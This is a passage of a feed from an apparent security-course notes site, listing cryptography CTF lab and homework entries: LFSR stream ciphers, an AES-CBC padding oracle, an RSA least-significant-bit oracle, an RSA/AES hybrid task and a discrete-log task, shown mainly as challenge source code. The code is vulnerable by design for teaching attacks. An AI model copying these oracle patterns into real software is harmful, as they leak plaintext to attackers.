 # f is the new bit that append in last position
 f = sum([self._state[i] for i in self._tap]) &amp;amp; 1

 # x is the output bit
 x = self._state[0]
 
 # self._state is a new state
 self._state = self._state[1:] + [f]
 return x

class triLFSR:
 def __init__(self, lfsr1, lfsr2, lfsr3):
 self.lfsr1 = lfsr1
 self.lfsr2 = lfsr2
 self.lfsr3 = lfsr3

 def getbit(self):
 x1 = self.lfsr1.getbit()
 x2 = self.lfsr2.getbit()
 x3 = self.lfsr3.getbit()
 return x2 if x1 else x3
# These are the state of lfsr1, lfsr2, and lfsr3
A = [random.randrange(2) for _ in range(27)]
B = [random.randrange(2) for _ in range(23)]
C = [random.randrange(2) for _ in range(25)]
print(A, B, C)

# tap is a filter that decide the last bit is 1 or 0
tap1 = [0, 13, 16, 26]
tap2 = [0, 5, 7, 22]
tap3 = [0, 17, 19, 24]

lfsr1 = LFSR(tap1, A)
lfsr2 = LFSR(tap2, B)
lfsr3 = LFSR(tap3, C)
cipher = triLFSR(lfsr1, lfsr2, lfsr3)

# Transfer the flag to ascii code and expressed in binary
# e.g. FLAG = &amp;#39;00001111&amp;#39; → &amp;#39;3030303031313131&amp;#39; → &amp;#39;001100000011000000110000...00110001&amp;#39;(64 bits)
flag = map(int, &amp;#39;&amp;#39;.join([&amp;#34;{:08b}&amp;#34;.format(c) for c in FLAG]))

output = []

for b in flag:
 # print(b)
 output.append(cipher.getbit() ^ b)

for _ in range(200):
 output.append(cipher.getbit())

# print(output)
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Crypto - 0x04(2023 Lab - POA)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/simple-crypto---0x042023-lab---poa/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/simple-crypto---0x042023-lab---poa/</guid><description>&lt;h1 id="simple-crypto---0x042023-lab---poa">
 Simple Crypto - 0x04(2023 Lab - POA)
 &lt;a class="anchor" href="#simple-crypto---0x042023-lab---poa">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://youtu.be/dYyNeMeDM20?si=BEvBPBzCsg8oWv_Q&amp;amp;t=8317"> Crypto I - Timmy&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source Code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#! /usr/bin/python3&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> Crypto.Cipher &lt;span style="color:#f92672">import&lt;/span> AES
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> os
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> secret &lt;span style="color:#f92672">import&lt;/span> FLAG
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">pad&lt;/span>(data, block_size):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> data &lt;span style="color:#f92672">+=&lt;/span> bytes([&lt;span style="color:#ae81ff">0x80&lt;/span>] &lt;span style="color:#f92672">+&lt;/span> [&lt;span style="color:#ae81ff">0x00&lt;/span>] &lt;span style="color:#f92672">*&lt;/span> (&lt;span style="color:#ae81ff">15&lt;/span> &lt;span style="color:#f92672">-&lt;/span> len(data) &lt;span style="color:#f92672">%&lt;/span> block_size))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> data
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># padding style: &amp;lt;oooooo[0x80][0x00]...[0x00]&amp;gt; (find first [0x80])&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">unpad&lt;/span>(data, block_size):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> len(data) &lt;span style="color:#f92672">%&lt;/span> block_size:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">raise&lt;/span> &lt;span style="color:#a6e22e">ValueError&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> padding_len &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> i &lt;span style="color:#f92672">in&lt;/span> range(&lt;span style="color:#ae81ff">1&lt;/span>, len(data) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> data[&lt;span style="color:#f92672">-&lt;/span>i] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0x80&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> padding_len &lt;span style="color:#f92672">=&lt;/span> i
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">elif&lt;/span> data[&lt;span style="color:#f92672">-&lt;/span>i] &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">0x00&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">raise&lt;/span> &lt;span style="color:#a6e22e">ValueError&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">raise&lt;/span> &lt;span style="color:#a6e22e">ValueError&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> data[:&lt;span style="color:#f92672">-&lt;/span>padding_len]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>key &lt;span style="color:#f92672">=&lt;/span> os&lt;span style="color:#f92672">.&lt;/span>urandom(&lt;span style="color:#ae81ff">16&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>cipher &lt;span style="color:#f92672">=&lt;/span> AES&lt;span style="color:#f92672">.&lt;/span>new(key, AES&lt;span style="color:#f92672">.&lt;/span>MODE_CBC)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ct &lt;span style="color:#f92672">=&lt;/span> cipher&lt;span style="color:#f92672">.&lt;/span>encrypt(pad(FLAG, AES&lt;span style="color:#f92672">.&lt;/span>block_size))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>iv &lt;span style="color:#f92672">=&lt;/span> cipher&lt;span style="color:#f92672">.&lt;/span>iv
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print((iv &lt;span style="color:#f92672">+&lt;/span> ct)&lt;span style="color:#f92672">.&lt;/span>hex())
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># same encryption&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">while&lt;/span> &lt;span style="color:#66d9ef">True&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> inp &lt;span style="color:#f92672">=&lt;/span> bytes&lt;span style="color:#f92672">.&lt;/span>fromhex(input()&lt;span style="color:#f92672">.&lt;/span>strip()) &lt;span style="color:#75715e"># hex style input&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> iv, ct &lt;span style="color:#f92672">=&lt;/span> inp[:&lt;span style="color:#ae81ff">16&lt;/span>], inp[&lt;span style="color:#ae81ff">16&lt;/span>:] &lt;span style="color:#75715e"># get first 16 bytes from input &lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> cipher &lt;span style="color:#f92672">=&lt;/span> AES&lt;span style="color:#f92672">.&lt;/span>new(key, AES&lt;span style="color:#f92672">.&lt;/span>MODE_CBC, iv) 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pt &lt;span style="color:#f92672">=&lt;/span> unpad(cipher&lt;span style="color:#f92672">.&lt;/span>decrypt(ct), AES&lt;span style="color:#f92672">.&lt;/span>block_size)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">&amp;#34;Well received :)&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">except&lt;/span> &lt;span style="color:#a6e22e">ValueError&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">&amp;#34;Something went wrong :(&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::&lt;/p></description></item><item><title>Simple Crypto - 0x05(2023 Lab - LSB)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/simple-crypto---0x052023-lab---lsb/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/simple-crypto---0x052023-lab---lsb/</guid><description>&lt;h1 id="simple-crypto---0x052023-lab---lsb">
 Simple Crypto - 0x05(2023 Lab - LSB)
 &lt;a class="anchor" href="#simple-crypto---0x052023-lab---lsb">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://www.youtube.com/live/mqQ2zgK8a0Y?si=GRgtEKGHsCNcKuqU&amp;amp;t=7176"> [edu-ctf 2023] week01 - crypto1 &lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#! /usr/bin/python3&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> Crypto.Util.number &lt;span style="color:#f92672">import&lt;/span> bytes_to_long, getPrime
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> os
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> secret &lt;span style="color:#f92672">import&lt;/span> FLAG
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>p &lt;span style="color:#f92672">=&lt;/span> getPrime(&lt;span style="color:#ae81ff">1024&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>q &lt;span style="color:#f92672">=&lt;/span> getPrime(&lt;span style="color:#ae81ff">1024&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>n &lt;span style="color:#f92672">=&lt;/span> p &lt;span style="color:#f92672">*&lt;/span> q
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>phi &lt;span style="color:#f92672">=&lt;/span> (p &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>) &lt;span style="color:#f92672">*&lt;/span> (q &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>e &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">65537&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>d &lt;span style="color:#f92672">=&lt;/span> pow(e, &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>, phi)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>m &lt;span style="color:#f92672">=&lt;/span> bytes_to_long(FLAG &lt;span style="color:#f92672">+&lt;/span> os&lt;span style="color:#f92672">.&lt;/span>urandom(&lt;span style="color:#ae81ff">256&lt;/span> &lt;span style="color:#f92672">-&lt;/span> len(FLAG)))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">assert&lt;/span> m &lt;span style="color:#f92672">&amp;lt;&lt;/span> n
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>enc &lt;span style="color:#f92672">=&lt;/span> pow(m, e, n)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(n)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(e)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(enc)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">while&lt;/span> &lt;span style="color:#66d9ef">True&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> inp &lt;span style="color:#f92672">=&lt;/span> int(input()&lt;span style="color:#f92672">.&lt;/span>strip())
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pt &lt;span style="color:#f92672">=&lt;/span> pow(inp, d, n)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(pt &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::&lt;/p></description></item><item><title>Simple Crypto - 0x06(2023 HW - LFSR)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/simple-crypto---0x062023-hw---lfsr/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/simple-crypto---0x062023-hw---lfsr/</guid><description>&lt;h1 id="simple-crypto---0x062023-hw---lfsr">
 Simple Crypto - 0x06(2023 HW - LFSR)
 &lt;a class="anchor" href="#simple-crypto---0x062023-hw---lfsr">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://www.geeksforgeeks.org/python-list-xor/">Python – List XOR&lt;/a>
&lt;blockquote>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> funtools &lt;span style="color:#f92672">import&lt;/span> reduce
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>test_list &lt;span style="color:#f92672">=&lt;/span> [&lt;span style="color:#ae81ff">4&lt;/span>, &lt;span style="color:#ae81ff">6&lt;/span>, &lt;span style="color:#ae81ff">2&lt;/span>, &lt;span style="color:#ae81ff">3&lt;/span>, &lt;span style="color:#ae81ff">8&lt;/span>, &lt;span style="color:#ae81ff">9&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>res &lt;span style="color:#f92672">=&lt;/span> reduce(&lt;span style="color:#66d9ef">lambda&lt;/span> x, y: x &lt;span style="color:#f92672">^&lt;/span> y, test_list) &lt;span style="color:#75715e"># The output is 2&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/blockquote>
&lt;/li>
&lt;li>&lt;a href="https://www.qiniu.com/qfans/qnso-67006518#comments">Numpy矩陣乘法，但不是乘法，而是XOR的元素&lt;/a>
&lt;blockquote>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> numpy &lt;span style="color:#66d9ef">as&lt;/span> np
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>m1 &lt;span style="color:#f92672">=&lt;/span> np&lt;span style="color:#f92672">.&lt;/span>array([[&lt;span style="color:#ae81ff">1&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>], [&lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>], [&lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>]])
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>m2 &lt;span style="color:#f92672">=&lt;/span> np&lt;span style="color:#f92672">.&lt;/span>array([[&lt;span style="color:#ae81ff">1&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">1&lt;/span>], [&lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">1&lt;/span>], [&lt;span style="color:#ae81ff">1&lt;/span>, &lt;span style="color:#ae81ff">1&lt;/span>, &lt;span style="color:#ae81ff">1&lt;/span>]])
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>mr &lt;span style="color:#f92672">=&lt;/span> np&lt;span style="color:#f92672">.&lt;/span>empty((m2&lt;span style="color:#f92672">.&lt;/span>shape[&lt;span style="color:#ae81ff">0&lt;/span>], m1&lt;span style="color:#f92672">.&lt;/span>shape[&lt;span style="color:#ae81ff">1&lt;/span>]), dtype &lt;span style="color:#f92672">=&lt;/span> np&lt;span style="color:#f92672">.&lt;/span>int64)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">for&lt;/span> i &lt;span style="color:#f92672">in&lt;/span> range(mr&lt;span style="color:#f92672">.&lt;/span>shape[&lt;span style="color:#ae81ff">0&lt;/span>]):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> j &lt;span style="color:#f92672">in&lt;/span> range(mr&lt;span style="color:#f92672">.&lt;/span>shape[&lt;span style="color:#ae81ff">1&lt;/span>]):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> mr[i, j] &lt;span style="color:#f92672">=&lt;/span> np&lt;span style="color:#f92672">.&lt;/span>sum(m1[:, j] &lt;span style="color:#f92672">^&lt;/span> m2[i, :])
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(mr)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/blockquote>
&lt;/li>
&lt;li>&lt;a href="https://pyradise.com/%e4%bd%bf%e7%94%a8-python-%e4%be%86%e8%aa%8d%e8%ad%98%e7%9f%a9%e9%99%a3-915376207187">使用 Python 來認識矩陣&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://ithelp.ithome.com.tw/articles/10203624">[Day07]Learning Numpy - 建立、合併、分割 - CheetSheet for Numpy&lt;/a>&lt;/li>
&lt;li>Sage
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ sudo apt install sagemath -y &lt;span style="color:#75715e"># wsl/unix base可以直接安裝，如果是windows要下載sage binary，有1.4GB&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ sage -n &lt;span style="color:#75715e"># 開起sage notebook，也就是可以用sage kernel運行jupyter&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ sage &amp;lt;.py/.sage file&amp;gt; &lt;span style="color:#75715e"># 用sage運行腳本&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ sage &lt;span style="color:#75715e"># 直接開啟sage interactive shell&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>這一題和前面的triLFSR不一樣的地方在於他只有一層的LFSR，但他只會每個70個才會給一個state，換句話說我們只能拿到$S_{71&lt;em>0+70},\ S_{71&lt;/em>1+70},\ S_{71&lt;em>2+70},\ S_{71&lt;/em>3+70}&amp;hellip;$(從0開始算)，而前面256個拿到的State最後會和flag進行XOR，只有最後70個是最純粹的State&lt;/p></description></item><item><title>Simple Crypto - 0x07(2023 HW - Oracle)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/simple-crypto---0x072023-hw---oracle/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/simple-crypto---0x072023-hw---oracle/</guid><description>&lt;h1 id="simple-crypto---0x072023-hw---oracle">
 Simple Crypto - 0x07(2023 HW - Oracle)
 &lt;a class="anchor" href="#simple-crypto---0x072023-hw---oracle">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>POA/RSA&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Oracle.py&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">from Crypto.Util.number import bytes_to_long
from Crypto.Cipher import AES
from random import randbytes
from secret import aes_key, p, q

def pad(m):
 length = 16-len(m) % 16
 return m + chr(length).encode()*length

def unpad(c):
 length = c[-1]
 for char in c[-length:]:
 if char != length:
 raise ValueError
 return c[:-length]

def asymmetric_encryption(message, N, e):
 # encrypt message with RSA
 # message must be 16 bytes
 # padding 100 bytes random value
 padded_message = randbytes(100) + message
 return pow(bytes_to_long(padded_message), e, N)

def symmetric_encryption(message, key):
 # ecrypt message with AES + CBC Mode
 # message can be arbitrary length
 cipher = AES.new(key, AES.MODE_CBC)
 ct = cipher.encrypt(pad(message))
 iv = cipher.iv
 return iv, ct

## Alice: This is my public key.
# p = getPrime(512)
# q = getPrime(512)
N = p * q
e = 65537
print( f&amp;#34;{N = }, {e = }&amp;#34; )
# N = 69214008498642035761243756357619851816607540327248468473247478342523127723748756926949706235406640562827724567100157104972969498385528097714986614165867074449238186426536742677816881849038677123630836686152379963670139334109846133566156815333584764063197379180877984670843831985941733688575703811651087495223
# e = 65537

## Bob: I want to send message to Alice! But my message is too looooooong......
flag = open(&amp;#34;flag.png&amp;#34;, &amp;#34;rb&amp;#34;).read()

## Bob: Oh! I can use symmetric encryption.
iv, ct = symmetric_encryption(flag, aes_key)
encrypted_key = asymmetric_encryption(aes_key, N, e)
encrypted_iv = asymmetric_encryption(iv, N, e)
print( f&amp;#34;{encrypted_key = }&amp;#34; )
print( f&amp;#34;{encrypted_iv = }&amp;#34; )
open(&amp;#34;encrypted_flag.not_png&amp;#34;, &amp;#34;wb&amp;#34;).write(ct)

## Bob: Ha ha! Now no one can decrypt my message except Alice!
# encrypted_key = 65690013242775728459842109842683020587149462096059598501313133592635945234121561534622365974927219223034823754673718159579772056712404749324225325531206903216411508240699572153162745754564955215041783396329242482406426376133687186983187563217156659178000486342335478915053049498619169740534463504372971359692
# encrypted_iv = 35154524936059729204581782839781987236407179504895959653768093617367549802652967862418906182387861924584809825831862791349195432705129622783580000716829283234184762744224095175044663151370869751957952842383581513986293064879608592662677541628813345923397286253057417592725291925603753086190402107943880261658
&lt;/code>&lt;/pre>&lt;p>:::
:::spoiler Alice.py&lt;/p></description></item><item><title>Simple Crypto - 0x08(2023 Lab - dlog)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/simple-crypto---0x082023-lab---dlog/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/simple-crypto---0x082023-lab---dlog/</guid><description>&lt;h1 id="simple-crypto---0x082023-lab---dlog">
 Simple Crypto - 0x08(2023 Lab - dlog)
 &lt;a class="anchor" href="#simple-crypto---0x082023-lab---dlog">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://www.youtube.com/live/u4ZVc8PuJC0?si=2wbiGreg_BZQ-dff"> [edu-ctf 2023] week03 - crypto2 &lt;/a>
&lt;a href="https://hackmd.io/@SBK6401/SJobiaxQ3#5-Little-Knowledge-Proof">Cryptography and Network Security – Homework 2 - Little Knowledge Proof&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> Crypto.Util.number &lt;span style="color:#f92672">import&lt;/span> isPrime, bytes_to_long
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> os
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> secret &lt;span style="color:#f92672">import&lt;/span> FLAG
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>p &lt;span style="color:#f92672">=&lt;/span> int(input(&lt;span style="color:#e6db74">&amp;#34;give me a prime: &amp;#34;&lt;/span>)&lt;span style="color:#f92672">.&lt;/span>strip())
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">not&lt;/span> isPrime(p):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">&amp;#34;Do you know what is primes?&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> exit(&lt;span style="color:#ae81ff">0&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> p&lt;span style="color:#f92672">.&lt;/span>bit_length() &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">1024&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">&amp;#34;Bit length need to be 1024&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> exit(&lt;span style="color:#ae81ff">0&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>g &lt;span style="color:#f92672">=&lt;/span> int(input(&lt;span style="color:#e6db74">&amp;#34;give me a number: &amp;#34;&lt;/span>)&lt;span style="color:#f92672">.&lt;/span>strip())
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>flag &lt;span style="color:#f92672">=&lt;/span> bytes_to_long(FLAG)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(&lt;span style="color:#e6db74">&amp;#39;The hint about my secret:&amp;#39;&lt;/span>, pow(g, flag, p))
